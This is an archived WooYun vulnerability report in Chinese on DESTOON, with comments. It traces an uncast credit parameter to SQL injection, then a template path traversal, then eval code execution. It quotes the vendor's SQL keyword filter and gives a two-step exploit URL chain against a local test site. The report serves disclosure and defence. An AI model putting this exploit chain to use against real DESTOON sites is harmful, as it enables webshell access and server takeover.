{"id": 48361, "wybug_id": "wooyun-2014-078327", "wybug_title": "DESTOON前台getshell", "wybug_corp": "DESTOON", "wybug_author": "Noxxx", "wybug_date": "2014-10-04 21:07", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-13：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： 如题。。 详细说明：  \\module\\know\\answer.inc.php143 - 161行 \ncase 'raise': //这个功能是 \"知道功能\" 悬赏的次数更新,因为默认只允许2次提高悬赏的次数\t\t\tif($credit < 1) dalert($L['select_credit'], 'goback');\t\t//这里credit 不能小于 1                //由于php是弱语言,所以 1xxx 这样被转换过去就变成了 1 条件也就成立了\t\tif($credit > $_credit) dalert($L['lack_credit'], 'goback');\t\t$could_raise = $could_admin;//是否是 \"知道\"发布的作者.\t\tif($item['process'] != 1) $could_raise = false;\t\tif($item['raise'] >= $MOD['maxraise'])  $could_raise = false;\t\t//$MOD['maxraise']就是最大能 “提高悬赏” 次数。\t\t\tif($could_raise) { //条件通过进入这个流程\t\t\tif($credit >= $MOD['raisecredit']) {\t\t\t\t$addtime = $DT_TIME;\t\t\t\t$totime = $DT_TIME + $MOD['overdays']*86400 + $MOD['raisedays']*86400;\t\t\t} else {\t\t\t\t$addtime = $item['addtime'];\t\t\t\t$totime = $item['totime'] + $MOD['raisedays']*86400;\t\t\t}\t\t\t\t\t\t$db->query(\"UPDATE {$table} SET credit=credit+$credit,raise=raise+1,addtime=$addtime,totime=$totime WHERE itemid=$itemid\"); //看直接带入了 credit+$credit ,由于他$credit 并没有 int掉,所以导致能注入...\n但是有点就是防注入绕不过去了...慢蛋疼的 safe.func.php中的\n\"/select([\\s\\S]*?)from/i\"\n这个绕不过.不能子查询的话 也有没有多大的危害。于是我又找找,找到一个能提高危害等级的一段代码。在 /module/know/show.inc.php中 （这个文件就是展示信息用的）首先看第6行 \n$item = $db->get_one(\"SELECT * FROM {$table} WHERE itemid=$itemid\");item是等于我们 “提问知道” 的数据。由于我们掌握了一个 update的注入点，想更新什么都行咯。\n再看最后2行 \nif($item['template']) $template = $item['template'];// 这个我们可以更新来达到包含的目的include template($template, $module);//这个函数并不陌生..上次提交了个命令执行也是这个步骤\n\nfunction template($template = 'index', $dir = '') {\tglobal $CFG;\t$to = $dir ? DT_CACHE.'/tpl/'.$dir.'-'.$template.'.php' : DT_CACHE.'/tpl/'.$template.'.php';\t$isfileto = is_file($to);\t\tif($CFG['template_refresh'] || !$isfileto) {\t\tif($dir) $dir = $dir.'/';        $from = DT_ROOT.'/template/'.$CFG['template'].'/'.$dir.$template.'.htm';\t\tif($CFG['template'] != 'default' && !is_file($from)) {\t\t\t$from = DT_ROOT.'/template/default/'.$dir.$template.'.htm';\t\t}        if(!$isfileto || filemtime($from) > filemtime($to) || (filesize($to) == 0 && filesize($from) > 0)) {\t\t\trequire_once DT_ROOT.'/include/template.func.php';\t\t\ttemplate_compile($from, $to);\t\t}\t}\treturn $to;}\n如果是在win下就直接可以返回路径了,\nif(!$isfileto || filemtime($from) > filemtime($to) || (filesize($to) == 0 && filesize($from) > 0)) {\n这几个条件都不会成立.会 return $to;但是在 linux下 ,是不能跳出不存在的目录的。但是destoon很好的给我们创建了目录。Linux:\ntemplate_compile($from, $to);创建缓存文件。function template_compile($from, $to) {\t$content = template_parse(file_get($from));\tfile_put($to, $content);//关键是这个 file_put会帮我们创建目录,}function template_parse($str) {\tglobal $CFG;\t$str = preg_replace(\"/\\<\\!\\-\\-\\[(.+?)\\]\\-\\-\\>/\", \"\", $str);\t$str = preg_replace(\"/\\<\\!\\-\\-\\{(.+?)\\}\\-\\-\\>/s\", \"{\\\\1}\", $str);\t$str = preg_replace(\"/\\{template\\s+([^\\}]+)\\}/\", \"<?php include template(\\\\1);?>\", $str);\t$str = preg_replace(\"/\\{php\\s+(.+)\\}/\", \"<?php \\\\1?>\", $str);\t$str = preg_replace(\"/\\{if\\s+(.+?)\\}/\", \"<?php if(\\\\1) { ?>\", $str);\t$str = preg_replace(\"/\\{else\\}/\", \"<?php } else { ?>\", $str);\t$str = preg_replace(\"/\\{elseif\\s+(.+?)\\}/\", \"<?php } else if(\\\\1) { ?>\", $str);\t$str = preg_replace(\"/\\{\\/if\\}/\", \"<?php } ?>\\r\\n\", $str);\t$str = preg_replace(\"/\\{loop\\s+(\\S+)\\s+(\\S+)\\}/\", \"<?php if(is_array(\\\\1)) { foreach(\\\\1 as \\\\2) { ?>\", $str);\t$str = preg_replace(\"/\\{loop\\s+(\\S+)\\s+(\\S+)\\s+(\\S+)\\}/\", \"<?php if(is_array(\\\\1)) { foreach(\\\\1 as \\\\2 => \\\\3) { ?>\", $str);\t$str = preg_replace(\"/\\{\\/loop\\}/\", \"<?php } } ?>\", $str);\t$str = preg_replace(\"/\\{([a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*\\(([^{}]*)\\))\\}/\", \"<?php echo \\\\1;?>\", $str);\t$str = preg_replace(\"/<\\?php([^\\?]+)\\?>/es\", \"template_addquote('<?php\\\\1?>')\", $str);\t$str = preg_replace(\"/\\{(\\\\$[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\+\\-\\x7f-\\xff]*)\\}/\", \"<?php echo \\\\1;?>\", $str);\t$str = preg_replace(\"/\\{(\\\\$[a-zA-Z0-9_\\[\\]\\'\\\"\\$\\x7f-\\xff]+)\\}/es\", \"template_addquote('<?php echo \\\\1;?>')\", $str);\t$str = preg_replace(\"/\\{([A-Z_\\x7f-\\xff][A-Z0-9_\\x7f-\\xff]*)\\}/s\", \"<?php echo \\\\1;?>\", $str);\t$str = preg_replace(\"/\\'([A-Za-z]+)\\[\\'([A-Za-z\\.]+)\\'\\](.?)\\'/s\", \"'\\\\1[\\\\2]\\\\3'\", $str);\t$str = preg_replace(\"/(\\r?\\n)\\\\1+/\", \"\\\\1\", $str);\t$str = str_replace(\"\\t\", '', $str);\t$str = \"<?php defined('IN_DESTOON') or exit('Access Denied');?>\".$str;\tif($CFG['template_trim']) return strip_nr($str);\treturn $str;}\n\nfunction file_put($filename, $data) {\tdir_create(dirname($filename));\t\tif(@$fp = fopen($filename, 'wb')) {\t\tflock($fp, LOCK_EX);\t\t$len = fwrite($fp, $data);\t\tflock($fp, LOCK_UN);\t\tfclose($fp);\t\tif(DT_CHMOD) @chmod($filename, DT_CHMOD);\t\treturn $len;\t} else {\t\treturn false;\t}}\n\nfunction dir_create($path) {\tif(is_dir($path)) return true;\tif(DT_CACHE != DT_ROOT.'/file/cache' && strpos($path, DT_CACHE) !== false) {\t\t$dir = str_replace(DT_CACHE.'/', '', $path);\t\t$dir = dir_path($dir);\t\t$temp = explode('/', $dir);\t\t$cur_dir = DT_CACHE.'/';\t\t$max = count($temp) - 1;\t\tfor($i = 0; $i < $max; $i++) {\t\t\t$cur_dir .= $temp[$i].'/';\t\t\tif(is_dir($cur_dir)) continue;\t\t\t@mkdir($cur_dir);\t\t\tif(DT_CHMOD) @chmod($cur_dir, DT_CHMOD);\t\t\tif(!is_file($cur_dir.'/index.html') && !is_file($cur_dir.'/index.php')) file_copy(DT_ROOT.'/file/index.html', $cur_dir.'/index.html');\t\t}\t} else {\t\t$idx = strpos($path, '/file/') !== false ? true : false;\t\t$dir = str_replace(DT_ROOT.'/', '', $path);\t\t$dir = dir_path($dir);\t\t$temp = explode('/', $dir);\t\t$cur_dir = DT_ROOT.'/';\t\t$max = count($temp) - 1;\t\tfor($i = 0; $i < $max; $i++) {\t\t\t$cur_dir .= $temp[$i].'/';\t\t\tif(is_dir($cur_dir)) continue;\t\t\t@mkdir($cur_dir);\t\t\tif(DT_CHMOD) @chmod($cur_dir, DT_CHMOD);\t\t\tif($idx && !is_file($cur_dir.'/index.html') && !is_file($cur_dir.'/index.php')) file_copy(DT_ROOT.'/file/index.html', $cur_dir.'/index.html');\t\t}\t}\treturn is_dir($path);}\n最终linbux会创建know-这个目录因为,这个$dir是knowfunction template($template = 'index', $dir = '')所以不用担心在linux用/../../../跳不出去。\n\n上次我在360提交的东就是 tag.inc.php这里执行的代码。我们来看看,（因为这里是admin的文件,但是普通的就能包含进去始终是个很大的风险）。在 admin/tag.inc.php。\ndefined('IN_DESTOON') or exit('Access Denied');//common.inc.php 就定义了这个常量。\n93-99\n$tag_code .= ';';\t\t$tag_safe = substr($tag_code, 5, -7);\t\tforeach(array('(', '`', ',', ';') as $v) {\t\t\tif(strpos($tag_safe, $v) !== false) msg('标签内容包含不安全写法，禁止在线预览');\t\t}\t\tob_start();\t\teval($tag_code);\n这里似乎也没有什么限制了。白做的安全措施 最后执行还是的$tag_code。只要$tag_code不超过特定的长度就可以了。template需要等于：/../../../../admin/tag.inc现在想起来\nfunction strip_sql($string) {\t$match = array(\"/union/i\",\"/where/i\",\"/outfile/i\",\"/dumpfile/i\",\"/0x([a-z0-9]{2,})/i\",\"/select([\\s\\S]*?)from/i\",\"/select([\\s\\*\\/\\-\\(\\+@])/i\",\"/update([\\s\\*\\/\\-\\(\\+@])/i\",\"/replace([\\s\\*\\/\\-\\(\\+@])/i\",\"/delete([\\s\\*\\/\\-\\(\\+@])/i\",\"/drop([\\s\\*\\/\\-\\(\\+@])/i\",\"/load_file[\\s]*\\(/i\",\"/substring[\\s]*\\(/i\",\"/substr[\\s]*\\(/i\",\"/left[\\s]*\\(/i\",\"/concat[\\s]*\\(/i\",\"/concat_ws[\\s]*\\(/i\",\"/make_set[\\s]*\\(/i\",\"/ascii[\\s]*\\(/i\",\"/hex[\\s]*\\(/i\",\"/ord[\\s]*\\(/i\",\"/char[\\s]*\\(/i\");\t$replace = array('unio&#110;','wher&#101;','outfil&#101;','dumpfil&#101;','0&#120;\\\\1','selec&#116;\\\\1from','selec&#116;\\\\1','updat&#101;\\\\1','replac&#101;\\\\1','delet&#101;\\\\1','dro&#112;\\\\1','load_fil&#101;(','substrin&#103;(','subst&#114;(','lef&#116;(','conca&#116;(','concat_w&#115;(','make_se&#116;(','asci&#105;(','he&#120;(','or&#100;(','cha&#114;(');\treturn is_array($string) ? array_map('strip_sql', $string) : preg_replace($match, $replace, $string);}\n似乎没有什么编码让我更新上去。。0x让实体化了,CHAR也是那就只能先把 路径写到另外的字段了。template就=写入的字段了(ps:这个发布知道提问,需要管理员审核)   漏洞证明：  \n\n\n\n\n\n\n\n\n\n执行完,会自动转跳如果页面是空白就成功了。\n\nEXP：1.http://127.0.0.1/destoon/member/answer.php?itemid=6&action=raisecredit=1,template=introduce2.http://127.0.0.1/destoon/know/show.php?itemid=6action=preview&tag_code=EVAL($_POST[a]);&a=phpinfo();exit;（post[introduce] => /../../../../admin/tag.inc）另外还有个利用方式,参见 WooYun: Destoon前台getshell(CSRF任意代码执行) 这个   修复方案：  int掉credit.（admin目录的文件最好还是换个常量验证..）   版权声明：转载请注明来源 Noxxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-04 23:24 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  关注！！    \n     2014-10-05 00:28 |    \t\t你大爷 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:19        | hdjdj)\t\t \n  吊  洞主求抱大腿    \n     2014-10-05 08:01 |    \t\tj14n \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:23        | 我是一只小小小小鸟....)\t\t \n  mark    \n     2014-10-06 17:51 |    \t\t小.P.孩 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 小.P.孩)\t\t \n  必须顶起啊！！    \n     2014-10-13 09:37 |    \t\t′king \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:8        | 马甲甲)\t\t \n  很吊  这个哥们你没选择通用啊。    \n     2014-10-13 09:54 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  洞主功力颇深    \n     2014-10-13 10:24 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:41        )\t\t \n  @′king 呃..貌似是选了的啊。。居然忽略了，，    \n     2014-10-13 10:43 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:41        )\t\t \n  @pandas 小菜路过。。    \n     2014-12-12 11:39 |    \t\tmu0u \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 先做人，后做事。)\t\t \n  土豪，交个朋友吧。    \n     2014-12-15 17:06 |    \t\t微尘 \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:74        )\t\t \n  @Noxxx 我能弱弱的问下。你ID怎么看的吗？我审核完了是静态地址。找不到ID    \n     2014-12-15 19:08 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:41        )\t\t \n  @微尘 伪静态后面那个应该就是id了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}